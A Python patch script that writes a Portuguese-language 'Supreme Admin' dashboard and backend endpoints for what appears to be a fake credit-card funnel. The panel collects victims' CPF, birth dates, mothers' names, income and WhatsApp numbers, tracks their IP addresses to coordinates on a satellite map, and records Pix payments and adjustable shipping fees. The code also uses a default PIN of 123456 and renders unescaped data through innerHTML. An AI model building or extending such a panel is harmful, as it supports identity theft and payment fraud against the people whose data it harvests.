import os
from pathlib import Path
import re

app_file = Path("app.py")
content = app_file.read_text("utf-8")

# 1. Add new endpoints
new_endpoints = """
@app.route("/api/supreme/recover-pin", methods=["POST"])
def supreme_recover_pin():
    pin = os.environ.get("SUPREME_PIN", "123456")
    admin_id = os.environ.get("ADMIN_SUPREMO")
    token = os.environ.get("BOT_TOKEN")
    if not admin_id or not token:
        return jsonify({"ok": False, "error": "Bot ou Admin não configurados na Vercel."})
    
    import requests
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {
        "chat_id": admin_id,
        "text": f"🔐 <b>Solicitação de Recuperação (Nexus Gate)</b>\\n\\nO seu PIN Blindado é: <code>{pin}</code>\\n\\n<i>Se não foi você que solicitou, ignore.</i>",
        "parse_mode": "HTML"
    }
    requests.post(url, json=payload)
    return jsonify({"ok": True})

@app.route("/api/supreme/frete", methods=["POST"])
@supreme_required
def supreme_frete():
    data = get_secure_json()
    expresso = data.get("frete_expresso")
    padrao = data.get("frete_padrao")
    db = get_db()
    if expresso:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_expresso', ?)", (expresso,))
    if padrao:
        db.execute("INSERT OR REPLACE INTO sys_config (key, value) VALUES ('frete_padrao', ?)", (padrao,))
    db.commit()
    return jsonify({"ok": True})
"""

if "/api/supreme/recover-pin" not in content:
    content = content.replace("@app.errorhandler(404)", new_endpoints + "\n@app.errorhandler(404)")

# Modify supreme_dashboard to return more lead info
if "SELECT nome, cpf, whatsapp" in content:
    content = content.replace(
        "SELECT nome, cpf, whatsapp, card_style, card_color, location, device_brand, limite_aprovado, pix_status, created_at FROM leads",
        "SELECT * FROM leads"
    )

app_file.write_text(content, "utf-8")
print("app.py patched for advanced dashboard")

html_content = """<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Supreme Admin | Nexus Gate 9X Advanced</title>
    <!-- Leaflet for Satellite Maps -->
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap');
        
        :root {
            --bg-dark: #0A0A0A;
            --bg-panel: rgba(20, 20, 20, 0.7);
            --border-glow: rgba(229, 20, 122, 0.3);
            --pink-accent: #E5147A;
            --pink-glow: #ff1a8c;
            --text-main: #FFFFFF;
            --text-muted: #A0A0A0;
            --green: #10B981;
            --red: #EF4444;
            --blue: #3B82F6;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', sans-serif; }
        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; display: flex; justify-content: center; align-items: center; overflow-x: hidden; }

        /* Glitch Effect */
        .glitch { position: relative; color: white; font-size: 2rem; font-weight: 800; letter-spacing: 2px; text-transform: uppercase; }
        .glass-panel { background: var(--bg-panel); backdrop-filter: blur(16px); -webkit-backdrop-filter: blur(16px); border: 1px solid var(--border-glow); border-radius: 20px; padding: 40px; box-shadow: 0 0 40px rgba(0, 0, 0, 0.5); }
        .input-glass { width: 100%; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; padding: 12px; border-radius: 8px; outline: none; transition: border-color 0.3s; }
        .input-glass:focus { border-color: var(--pink-accent); }
        .btn-glass { background: rgba(229, 20, 122, 0.2); color: white; border: 1px solid var(--pink-accent); padding: 12px 20px; border-radius: 8px; font-weight: 800; cursor: pointer; transition: all 0.3s; }
        .btn-glass:hover { background: var(--pink-accent); box-shadow: 0 0 15px var(--pink-glow); transform: translateY(-2px); }

        /* PIN Screen */
        #pin-screen { display: flex; flex-direction: column; align-items: center; width: 100%; max-width: 400px; z-index: 10; }
        .pin-display { display: flex; gap: 12px; margin: 30px 0; }
        .pin-dot { width: 16px; height: 16px; border-radius: 50%; border: 2px solid var(--pink-accent); transition: all 0.2s; }
        .pin-dot.filled { background: var(--pink-accent); box-shadow: 0 0 10px var(--pink-glow); }
        .numpad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; width: 100%; }
        .num-btn { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; font-size: 1.5rem; font-weight: 600; padding: 20px; border-radius: 12px; cursor: pointer; transition: all 0.2s; }
        .num-btn:hover { background: rgba(229, 20, 122, 0.2); border-color: var(--pink-accent); }
        .num-btn:active { transform: scale(0.95); }

        /* Dashboard */
        #dashboard { display: none; width: 100%; max-width: 1500px; padding: 40px 20px; flex-direction: column; animation: fadeIn 0.5s ease-out; }
        .dash-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 40px; border-bottom: 1px solid var(--border-glow); padding-bottom: 20px; }
        .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 24px; margin-bottom: 40px; }
        .stat-card { padding: 24px; display: flex; flex-direction: column; gap: 12px; position: relative; overflow: hidden; }
        .stat-card::before { content: ''; position: absolute; top: 0; left: 0; width: 4px; height: 100%; background: var(--pink-accent); box-shadow: 0 0 15px var(--pink-glow); }
        .stat-title { color: var(--text-muted); font-size: 0.85rem; text-transform: uppercase; letter-spacing: 1px; font-weight: 600; }
        .stat-value { font-size: 2.5rem; font-weight: 800; color: white; }

        /* Progress Bars */
        .bar-row { display: flex; align-items: center; gap: 12px; margin-top:8px; }
        .bar-label { width: 90px; font-size: 0.75rem; color: var(--text-muted); font-weight: 600; }
        .bar-track { flex: 1; height: 8px; background: rgba(255,255,255,0.1); border-radius: 4px; overflow: hidden; }
        .bar-fill { height: 100%; background: var(--pink-accent); box-shadow: 0 0 10px var(--pink-accent); border-radius: 4px; transition: width 1s cubic-bezier(0.4, 0, 0.2, 1); }
        .bar-val { font-size: 0.8rem; font-weight: 800; min-width: 30px; text-align: right; }

        /* Tables & Filters */
        .filters { display: flex; gap: 16px; margin-bottom: 16px; flex-wrap: wrap; }
        .filter-select { background: var(--bg-dark); color: white; border: 1px solid rgba(255,255,255,0.2); padding: 8px 12px; border-radius: 8px; outline: none; }
        .leads-table-container { width: 100%; overflow-x: auto; max-height: 500px; }
        table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
        th, td { padding: 16px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.05); }
        th { color: var(--text-muted); font-weight: 600; text-transform: uppercase; position: sticky; top: 0; background: var(--bg-panel); backdrop-filter: blur(10px); }
        tr:hover { background: rgba(229, 20, 122, 0.1); cursor: pointer; }
        .badge { padding: 4px 8px; border-radius: 4px; font-size: 0.7rem; font-weight: 800; text-transform: uppercase; }
        .badge.approved { background: rgba(16, 185, 129, 0.2); color: var(--green); border: 1px solid rgba(16, 185, 129, 0.3); }
        .badge.pending { background: rgba(245, 158, 11, 0.2); color: #F59E0B; border: 1px solid rgba(245, 158, 11, 0.3); }
        
        /* Modal Profile */
        #modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); display: none; justify-content: center; align-items: center; z-index: 100; opacity: 0; transition: opacity 0.3s; }
        #lead-modal { background: var(--bg-dark); border: 1px solid var(--border-glow); border-radius: 16px; width: 90%; max-width: 1000px; max-height: 90vh; overflow-y: auto; padding: 0; display: flex; flex-direction: column; transform: scale(0.95); transition: transform 0.3s; }
        .modal-header { padding: 24px; border-bottom: 1px solid rgba(255,255,255,0.1); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; background: rgba(10,10,10,0.9); z-index: 10; }
        .modal-body { padding: 24px; display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
        @media (max-width: 768px) { .modal-body { grid-template-columns: 1fr; } }
        
        .profile-group { background: rgba(255,255,255,0.02); padding: 20px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }
        .profile-item { margin-bottom: 12px; display: flex; justify-content: space-between; border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 4px; }
        .profile-item span:first-child { color: var(--text-muted); font-size: 0.8rem; }
        .profile-item span:last-child { font-weight: 600; font-size: 0.85rem; color: white; text-align: right; }
        
        #map { width: 100%; height: 250px; border-radius: 12px; border: 1px solid var(--pink-accent); margin-top: 16px; }

        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
    </style>
</head>
<body>

    <!-- SECURE PIN LOGIN -->
    <div id="pin-screen" class="glass-panel">
        <div style="color:var(--green); font-size:0.85rem; font-weight:600; padding:8px 16px; background:rgba(16,185,129,0.1); border:1px solid rgba(16,185,129,0.3); border-radius:8px; margin-bottom:20px;">
            NEXUS GATE BLINDADO
        </div>
        <h2 class="glitch" data-text="ACESSO RESTRITO">ACESSO RESTRITO</h2>
        <p style="color:var(--text-muted); font-size:0.85rem; margin-top:10px;">Insira o PIN de 6 dígitos.</p>
        
        <div class="pin-display">
            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
        </div>

        <div class="numpad">
            <button class="num-btn" onclick="addPin('1')">1</button>
            <button class="num-btn" onclick="addPin('2')">2</button>
            <button class="num-btn" onclick="addPin('3')">3</button>
            <button class="num-btn" onclick="addPin('4')">4</button>
            <button class="num-btn" onclick="addPin('5')">5</button>
            <button class="num-btn" onclick="addPin('6')">6</button>
            <button class="num-btn" onclick="addPin('7')">7</button>
            <button class="num-btn" onclick="addPin('8')">8</button>
            <button class="num-btn" onclick="addPin('9')">9</button>
            <button class="num-btn" onclick="clearPin()" style="color:var(--red); font-size:1rem;">LIMPAR</button>
            <button class="num-btn" onclick="addPin('0')">0</button>
            <button class="num-btn" onclick="submitPin()" style="color:var(--pink-accent);">⮐</button>
        </div>
        <button onclick="recoverPin()" style="margin-top:20px; background:transparent; border:none; color:var(--text-muted); text-decoration:underline; cursor:pointer; font-size:0.8rem;">Esqueci o PIN (Enviar no Telegram Privado)</button>
        <div id="pin-error" style="color:var(--red); font-size:0.8rem; margin-top:16px; height:16px;"></div>
    </div>

    <!-- SUPREME DASHBOARD -->
    <div id="dashboard">
        <div class="dash-header">
            <div>
                <h1 class="glitch" style="font-size:1.8rem;" data-text="SUPREME COMMAND">SUPREME COMMAND</h1>
                <p style="color:var(--text-muted); font-size:0.9rem; margin-top:5px;">Monitoramento Demográfico Avançado</p>
            </div>
            <div style="display:flex; gap:16px;">
                <button class="btn-glass" onclick="location.reload()">ATUALIZAR DADOS</button>
            </div>
        </div>

        <div class="grid-container">
            <!-- KPIs -->
            <div class="glass-panel stat-card">
                <div class="stat-title">Leads Capturados (Entradas)</div>
                <div class="stat-value" id="val-entradas">0</div>
            </div>
            <div class="glass-panel stat-card">
                <div class="stat-title">Demografia: Gênero</div>
                <div class="chart-bars" id="gender-bars"></div>
            </div>
            <div class="glass-panel stat-card">
                <div class="stat-title">Demografia: Faixa Etária</div>
                <div class="chart-bars" id="age-bars"></div>
            </div>
            <div class="glass-panel stat-card">
                <div class="stat-title">Receita Aprovada</div>
                <div class="stat-value stat-green" id="val-receita">R$ 0,00</div>
            </div>

            <!-- CONFIGURAÇÕES DE FRETE -->
            <div class="glass-panel stat-card" style="grid-column: span 1;">
                <div class="stat-title">Controle de Fretes</div>
                <div style="display:flex; flex-direction:column; gap:10px; margin-top:10px;">
                    <div>
                        <label style="font-size:0.75rem; color:var(--text-muted);">Expresso (Ex: 29,90)</label>
                        <input type="text" id="frete_expresso" class="input-glass" style="padding:8px;">
                    </div>
                    <div>
                        <label style="font-size:0.75rem; color:var(--text-muted);">Padrão (Ex: 24,30)</label>
                        <input type="text" id="frete_padrao" class="input-glass" style="padding:8px;">
                    </div>
                    <button class="btn-glass" onclick="updateFrete()">Salvar Fretes</button>
                    <div id="frete-status" style="font-size:0.75rem; color:var(--green);"></div>
                </div>
            </div>

            <!-- REGIONS & DEVICES -->
            <div class="glass-panel stat-card" style="grid-column: span 3;">
                <div style="display:flex; gap:40px; flex-wrap:wrap;">
                    <div style="flex:1; min-width:250px;">
                        <div class="stat-title">Monitoramento Regional (Top 5)</div>
                        <div class="chart-bars" id="region-bars"></div>
                    </div>
                    <div style="flex:1; min-width:250px;">
                        <div class="stat-title">Dispositivos Utilizados</div>
                        <div class="chart-bars" id="device-bars"></div>
                    </div>
                </div>
            </div>
        </div>

        <!-- RECENT LEADS -->
        <div class="glass-panel" style="width:100%;">
            <div class="stat-title" style="margin-bottom: 20px; display:flex; justify-content:space-between;">
                <span>Análise de Leads (Clique para ver Perfil Completo e Localização Satélite)</span>
                <div class="filters">
                    <select class="filter-select" id="filter-gender" onchange="renderLeads()"><option value="ALL">Todos Gêneros</option><option value="M">Homens</option><option value="F">Mulheres</option></select>
                    <select class="filter-select" id="filter-status" onchange="renderLeads()"><option value="ALL">Todos Status</option><option value="approved">Pagos</option><option value="pending">Pendentes</option></select>
                </div>
            </div>
            <div class="leads-table-container">
                <table>
                    <thead>
                        <tr>
                            <th>Data</th><th>Nome</th><th>Gênero</th><th>Idade</th><th>Região</th><th>Cartão</th><th>Limite</th><th>Status Pix</th>
                        </tr>
                    </thead>
                    <tbody id="leads-body"></tbody>
                </table>
            </div>
        </div>
        
        <!-- GERENTE CONFIG -->
        <div class="glass-panel" style="width:100%; margin-top: 40px; display:flex; gap:20px; flex-wrap:wrap;">
            <div style="flex:1; min-width:300px;">
                <div class="stat-title" style="margin-bottom: 20px;">Gerenciar Perfil do Gerente</div>
                <div style="display:flex; flex-direction:column; gap:16px;">
                    <div>
                        <label style="font-size:0.8rem; color:var(--text-muted); display:block; margin-bottom:8px;">Nome</label>
                        <input type="text" id="mgr-name" class="input-glass">
                    </div>
                    <div>
                        <label style="font-size:0.8rem; color:var(--text-muted); display:block; margin-bottom:8px;">Tempo de Empresa</label>
                        <input type="number" id="mgr-since" class="input-glass">
                    </div>
                    <div>
                        <label style="font-size:0.8rem; color:var(--text-muted); display:block; margin-bottom:8px;">Foto (Upload Criptografado)</label>
                        <input type="file" id="mgr-photo" accept="image/*" class="input-glass">
                    </div>
                    <button class="btn-glass" onclick="saveManager()">SALVAR ALTERAÇÕES</button>
                    <div id="mgr-status" style="color:var(--green); font-size:0.85rem;"></div>
                </div>
            </div>
            <div style="flex:0.5; min-width:250px; display:flex; flex-direction:column; align-items:center; justify-content:center; background:rgba(0,0,0,0.3); border-radius:12px; padding:20px;">
                <img id="mgr-preview" src="" style="width:120px; height:120px; border-radius:50%; border:3px solid var(--pink-accent); object-fit:cover; margin-bottom:16px;">
                <div id="mgr-name-preview" style="font-size:1.2rem; font-weight:800;">Nome</div>
                <div id="mgr-since-preview" style="font-size:0.85rem; color:var(--text-muted);">Desde 2025</div>
            </div>
        </div>
    </div>

    <!-- MODAL PROFILE -->
    <div id="modal-overlay">
        <div id="lead-modal">
            <div class="modal-header">
                <h2 style="color:white; font-size:1.4rem;">Perfil Detalhado do Lead</h2>
                <button onclick="closeModal()" style="background:transparent; border:none; color:white; font-size:1.5rem; cursor:pointer;">&times;</button>
            </div>
            <div class="modal-body">
                <div class="profile-group" id="prof-dados"></div>
                <div class="profile-group">
                    <div style="font-size:0.9rem; color:var(--text-muted); margin-bottom:12px; font-weight:600; text-transform:uppercase;">Rastreamento Geográfico Satélite</div>
                    <div id="prof-geo"></div>
                    <div id="map"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let currentPin = "";
        let allLeads = [];
        let mapInstance = null;
        let mapMarker = null;
        
        window.onload = () => { if(document.cookie.includes('supreme_token=')) loadDashboard(); };

        function addPin(num) { if(currentPin.length < 6) { currentPin += num; updateDots(); if(currentPin.length === 6) submitPin(); } }
        function clearPin() { currentPin = ""; updateDots(); document.getElementById('pin-error').innerText = ""; }
        function updateDots() { document.querySelectorAll('.pin-dot').forEach((dot, index) => index < currentPin.length ? dot.classList.add('filled') : dot.classList.remove('filled')); }
        
        async function recoverPin() {
            try {
                const res = await fetch('/api/supreme/recover-pin', {method: 'POST'});
                const data = await res.json();
                if(data.ok) alert("✅ PIN enviado no Privado do Telegram do Admin Supremo!");
                else alert("❌ Erro: " + data.error);
            } catch(e) { alert("Erro de conexão."); }
        }

        async function submitPin() {
            if(currentPin.length !== 6) return;
            const errDiv = document.getElementById('pin-error');
            errDiv.innerText = "Verificando criptografia...";
            try {
                const res = await fetch('/api/supreme/auth', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({pin: currentPin}) });
                const data = await res.json();
                if(data.ok) {
                    errDiv.innerText = "Acesso Concedido."; errDiv.style.color = "var(--green)";
                    setTimeout(() => { document.getElementById('pin-screen').style.display = 'none'; loadDashboard(); }, 500);
                } else throw new Error(data.error || "Acesso Negado.");
            } catch(e) {
                errDiv.innerText = e.message;
                const p = document.getElementById('pin-screen'); p.style.animation='none'; p.offsetHeight; p.style.animation='shake 0.4s';
                currentPin = ""; setTimeout(updateDots, 400);
            }
        }
        
        async function loadDashboard() {
            try {
                const res = await fetch('/api/supreme/dashboard');
                if(res.status === 403 || res.status === 401) { document.getElementById('pin-screen').style.display = 'flex'; document.getElementById('dashboard').style.display = 'none'; return; }
                const data = await res.json();
                if(data.ok) {
                    document.getElementById('pin-screen').style.display = 'none';
                    document.getElementById('dashboard').style.display = 'flex';
                    processLeads(data.stats.leads);
                    populateDash(data.stats);
                    loadManager();
                    loadConfig();
                }
            } catch(e) {}
        }
        
        // Advanced Analytics processing
        function processLeads(leads) {
            allLeads = leads.map(l => {
                // Calc Age
                let age = "-";
                if(l.data_nasc && l.data_nasc.includes('/')) {
                    const parts = l.data_nasc.split('/');
                    if(parts.length===3) {
                        const birth = new Date(parts[2], parts[1]-1, parts[0]);
                        const diff = Date.now() - birth.getTime();
                        age = Math.floor(diff / (1000 * 60 * 60 * 24 * 365.25));
                    }
                }
                l._age = age;
                
                // Guess Gender
                let gender = "U";
                if(l.nome) {
                    const first = l.nome.split(' ')[0].toLowerCase();
                    if(first.endsWith('a') || first.endsWith('e')) gender = "F";
                    else gender = "M";
                    // Overrides
                    if(['joao','lucas','marcos','matheus','pedro','jose','gabriel'].includes(first)) gender = "M";
                    if(['aline','ariane','rose','cleide','simone'].includes(first)) gender = "F";
                }
                l._gender = gender;
                return l;
            });
            renderLeads();
        }

        function renderLeads() {
            const filterG = document.getElementById('filter-gender').value;
            const filterS = document.getElementById('filter-status').value;
            
            const filtered = allLeads.filter(l => {
                if(filterG !== 'ALL' && l._gender !== filterG) return false;
                if(filterS !== 'ALL' && (l.pix_status||'pending') !== filterS) return false;
                return true;
            });
            
            const tbody = document.getElementById('leads-body');
            tbody.innerHTML = '';
            filtered.forEach(l => {
                const d = new Date(l.created_at * 1000);
                let badgeClass = l.pix_status === 'approved' ? 'approved' : 'pending';
                let badgeText = l.pix_status === 'approved' ? 'PAGO' : 'PENDENTE';
                let gText = l._gender === 'M' ? '🧔 Homem' : '👩 Mulher';
                
                tbody.innerHTML += `
                    <tr onclick='openProfile(${JSON.stringify(l).replace(/'/g, "&apos;")})'>
                        <td style="color:var(--text-muted)">${d.toLocaleDateString()}</td>
                        <td style="font-weight:600">${l.nome ? l.nome.split(' ')[0] : 'Desc.'}</td>
                        <td>${gText}</td>
                        <td>${l._age} anos</td>
                        <td style="color:var(--text-muted)">${l.location || '-'}</td>
                        <td style="color:var(--pink-accent);font-weight:600">${l.card_style||'-'}</td>
                        <td style="color:var(--green);font-weight:600">R$ ${l.limite_aprovado||'0'}</td>
                        <td><span class="badge ${badgeClass}">${badgeText}</span></td>
                    </tr>
                `;
            });
            
            // Render Demographics
            renderDemographics(filtered);
        }

        function renderDemographics(data) {
            // Gender
            let mCount = data.filter(l => l._gender === 'M').length;
            let fCount = data.filter(l => l._gender === 'F').length;
            const genMax = Math.max(mCount, fCount, 1);
            document.getElementById('gender-bars').innerHTML = `
                <div class="bar-row"><div class="bar-label">Homens</div><div class="bar-track"><div class="bar-fill" style="width:${(mCount/genMax)*100}%"></div></div><div class="bar-val">${mCount}</div></div>
                <div class="bar-row"><div class="bar-label">Mulheres</div><div class="bar-track"><div class="bar-fill" style="width:${(fCount/genMax)*100}%"></div></div><div class="bar-val">${fCount}</div></div>
            `;
            
            // Age Groups
            const ages = { '18-25':0, '26-35':0, '36-45':0, '46+':0 };
            data.forEach(l => {
                if(l._age === "-") return;
                if(l._age <= 25) ages['18-25']++;
                else if(l._age <= 35) ages['26-35']++;
                else if(l._age <= 45) ages['36-45']++;
                else ages['46+']++;
            });
            const maxAge = Math.max(...Object.values(ages), 1);
            let ageHtml = '';
            for(let k in ages) {
                ageHtml += `<div class="bar-row"><div class="bar-label">${k} anos</div><div class="bar-track"><div class="bar-fill" style="width:${(ages[k]/maxAge)*100}%"></div></div><div class="bar-val">${ages[k]}</div></div>`;
            }
            document.getElementById('age-bars').innerHTML = ageHtml;
        }

        function populateDash(stats) {
            document.getElementById('val-entradas').innerText = stats.entradas;
            document.getElementById('val-receita').innerText = `R$ ${stats.receita.toFixed(2).replace('.', ',')}`;
            
            // Regions & Devices
            const regContainer = document.getElementById('region-bars'); regContainer.innerHTML = '';
            const maxReg = Math.max(...stats.regions.map(r => r.count), 1);
            stats.regions.forEach(r => regContainer.innerHTML += `<div class="bar-row"><div class="bar-label">${r.name.substring(0,12)}</div><div class="bar-track"><div class="bar-fill" style="width: ${(r.count/maxReg)*100}%"></div></div><div class="bar-val">${r.count}</div></div>`);
            
            const devContainer = document.getElementById('device-bars'); devContainer.innerHTML = '';
            const maxDev = Math.max(...stats.devices.map(d => d.count), 1);
            stats.devices.forEach(d => devContainer.innerHTML += `<div class="bar-row"><div class="bar-label">${d.name}</div><div class="bar-track"><div class="bar-fill" style="width: ${(d.count/maxDev)*100}%"></div></div><div class="bar-val">${d.count}</div></div>`);
        }

        // Profile Modal & Map
        async function openProfile(l) {
            const overlay = document.getElementById('modal-overlay');
            overlay.style.display = 'flex';
            setTimeout(() => { overlay.style.opacity = '1'; document.getElementById('lead-modal').style.transform = 'scale(1)'; }, 10);
            
            let pData = `
                <div style="font-size:0.9rem; color:var(--text-muted); margin-bottom:12px; font-weight:600; text-transform:uppercase;">Respostas do Funil</div>
                <div class="profile-item"><span>Nome Completo</span><span>${l.nome||'-'}</span></div>
                <div class="profile-item"><span>CPF</span><span>${l.cpf||'-'}</span></div>
                <div class="profile-item"><span>Data de Nasc. (Idade)</span><span>${l.data_nasc||'-'} (${l._age} anos)</span></div>
                <div class="profile-item"><span>Nome da Mãe</span><span>${l.nome_mae||'-'}</span></div>
                <div class="profile-item"><span>Renda Mensal</span><span>${l.renda||'-'}</span></div>
                <div class="profile-item"><span>Profissão</span><span>${l.tipo_renda||'-'}</span></div>
                <div class="profile-item"><span>Motivo do Cartão</span><span>${l.motivo_credito||'-'}</span></div>
                <div class="profile-item"><span>Dia de Vencimento</span><span>${l.dia_vencimento||'-'}</span></div>
                <div class="profile-item"><span>WhatsApp</span><span>${l.whatsapp||'-'}</span></div>
                <div class="profile-item" style="border-top:1px solid rgba(229,20,122,0.5); padding-top:12px; margin-top:12px;"><span>Design do Cartão</span><span style="color:var(--pink-accent)">${l.card_style||'-'} (${l.card_color||'-'})</span></div>
                <div class="profile-item"><span>Limite Aprovado</span><span style="color:var(--green)">R$ ${l.limite_aprovado||'0'}</span></div>
            `;
            document.getElementById('prof-dados').innerHTML = pData;
            
            document.getElementById('prof-geo').innerHTML = `
                <div class="profile-item"><span>Endereço IP</span><span>${l.ip||'-'}</span></div>
                <div class="profile-item"><span>Região/Estado</span><span>${l.location||'-'}</span></div>
                <div class="profile-item"><span>Aparelho</span><span>${l.device_brand||'-'}</span></div>
                <div class="profile-item" id="geo-status"><span style="color:var(--pink-accent)">Carregando Satélite...</span></div>
            `;

            // Setup Map
            if(mapInstance) { mapInstance.remove(); mapInstance = null; mapMarker = null; }
            document.getElementById('map').innerHTML = "<div id='map-container' style='width:100%; height:100%; border-radius:12px;'></div>";
            
            if(l.ip && l.ip !== "127.0.0.1") {
                try {
                    const res = await fetch(`http://ip-api.com/json/${l.ip}`);
                    const geo = await res.json();
                    if(geo.status === 'success') {
                        document.getElementById('geo-status').innerHTML = `<span>Coordenadas</span><span>Lat: ${geo.lat}, Lon: ${geo.lon}</span>`;
                        initMap(geo.lat, geo.lon);
                    } else {
                        document.getElementById('geo-status').innerHTML = `<span>Satélite</span><span>Indisponível</span>`;
                    }
                } catch(e) {}
            }
        }
        
        function initMap(lat, lon) {
            mapInstance = L.map('map-container').setView([lat, lon], 14);
            L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/World_Imagery/MapServer/tile/{z}/{y}/{x}', {
                attribution: 'Tiles &copy; Esri'
            }).addTo(mapInstance);
            mapMarker = L.marker([lat, lon]).addTo(mapInstance);
        }

        function closeModal() {
            const overlay = document.getElementById('modal-overlay');
            overlay.style.opacity = '0';
            document.getElementById('lead-modal').style.transform = 'scale(0.95)';
            setTimeout(() => overlay.style.display = 'none', 300);
        }

        // Manager Logic
        async function loadManager() {
            try {
                const res = await fetch('/api/supreme/manager'); const data = await res.json();
                if(data.ok) {
                    document.getElementById('mgr-name').value = data.manager.name;
                    document.getElementById('mgr-since').value = data.manager.since_year;
                    document.getElementById('mgr-preview').src = data.manager.photo_url;
                    document.getElementById('mgr-name-preview').innerText = data.manager.name;
                    document.getElementById('mgr-since-preview').innerText = "Desde " + data.manager.since_year;
                }
            } catch(e) {}
        }
        
        async function saveManager() {
            const payload = { name: document.getElementById('mgr-name').value, since_year: document.getElementById('mgr-since').value };
            const fileInput = document.getElementById('mgr-photo');
            if(fileInput.files.length > 0) {
                const r = new FileReader(); r.readAsDataURL(fileInput.files[0]);
                r.onload = async function() { payload.photo_url = r.result; await sendManagerUpdate(payload); };
            } else await sendManagerUpdate(payload);
        }
        async function sendManagerUpdate(payload) {
            try {
                const res = await fetch('/api/supreme/manager', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload)});
                if((await res.json()).ok) { document.getElementById('mgr-status').innerText = "✅ Salvo!"; loadManager(); setTimeout(()=>document.getElementById('mgr-status').innerText="", 3000); }
            } catch(e) {}
        }
        
        // Config Frete
        async function loadConfig() {
            try {
                const res = await fetch('/api/config');
                const data = await res.json();
                document.getElementById('frete_expresso').value = data.frete_expresso || '29,90';
                document.getElementById('frete_padrao').value = data.frete_padrao || '24,30';
            } catch(e) {}
        }
        
        async function updateFrete() {
            const expresso = document.getElementById('frete_expresso').value;
            const padrao = document.getElementById('frete_padrao').value;
            try {
                const res = await fetch('/api/supreme/frete', {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({frete_expresso: expresso, frete_padrao: padrao})});
                if((await res.json()).ok) { document.getElementById('frete-status').innerText = "✅ Fretes Atualizados!"; setTimeout(()=>document.getElementById('frete-status').innerText="", 3000); }
            } catch(e) {}
        }
    </script>
</body>
</html>
"""

html_path = Path("templates/supreme_admin.html")
html_path.write_text(html_content, "utf-8")
print("Templates patched.")
